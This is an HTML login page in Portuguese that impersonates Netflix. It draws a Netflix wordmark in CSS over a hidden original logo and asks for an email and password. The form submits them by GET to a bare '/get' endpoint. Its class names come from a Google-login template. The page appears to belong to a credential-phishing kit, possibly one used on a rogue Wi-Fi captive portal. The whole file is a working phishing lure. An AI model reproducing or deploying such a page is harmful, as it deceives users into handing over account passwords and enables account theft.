<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #141414;
        color: white;
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }

      .login-container {
        width: 360px;
        background-color: rgba(20, 20, 20, 0.9);
        padding: 40px 30px;
        border-radius: 8px;
        box-shadow: 0 0 30px #e50914;
      }

      #logo {
        text-align: center;
        margin-bottom: 30px;
      }

      #logo svg {
        display: none; /* escondendo logo antigo */
      }

      #logo::before {
        content: "NETFLIX";
        font-weight: 900;
        font-size: 36px;
        color: #e50914;
        letter-spacing: 4px;
        font-family: 'Arial Black', Arial, sans-serif;
      }

      .g-h1 {
        font-size: 28px;
        text-align: left;
        font-weight: 700;
        margin: 0 0 20px 0;
      }

      .g-h2 {
        font-size: 14px;
        color: #b3b3b3;
        text-align: left;
        margin: 0 0 30px 0;
      }

      .g-input {
        width: 100%;
        height: 40px;
        background-color: #333;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        padding: 0 12px;
        margin-bottom: 20px;
        color: white;
      }

      .create-account {
        font-size: 13px;
        color: #b3b3b3;
        text-decoration: none;
        float: right;
        margin-top: 10px;
      }

      .create-account:hover {
        text-decoration: underline;
      }

      .gbtn-primary {
        width: 100%;
        height: 40px;
        background-color: #e50914;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        font-weight: 700;
        color: white;
        cursor: pointer;
      }

      .gbtn-primary:hover {
        background-color: #f6121d;
      }

      .text {
        font-size: 12px;
        color: #666;
        margin-bottom: 20px;
      }

      .txt {
        color: #b3b3b3;
        text-decoration: none;
      }

      .txt:hover {
        text-decoration: underline;
      }
    </style>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
  </head>
  <body>
    <div class="login-container">
      <div id="logo"></div>
      <form action="/get" id="email-form-step">
        <h1 class="g-h1">Entrar</h1>
        <h2 class="g-h2">Acesse sua conta Netflix</h2>
        <input name="email" type="text" class="g-input" placeholder="Email ou telefone" required />
        <input name="password" type="password" class="g-input" placeholder="Senha" required />
        <div class="text">
          Não é seu computador? Use o Modo Convidado para maior privacidade. <a href="#" class="txt">Saiba mais</a>
        </div>
        <button class="gbtn-primary" type="submit">Entrar</button>
        <a class="create-account" href="caca.html">Novo por aqui? Crie sua conta</a>
      </form>
    </div>
  </body>
</html>
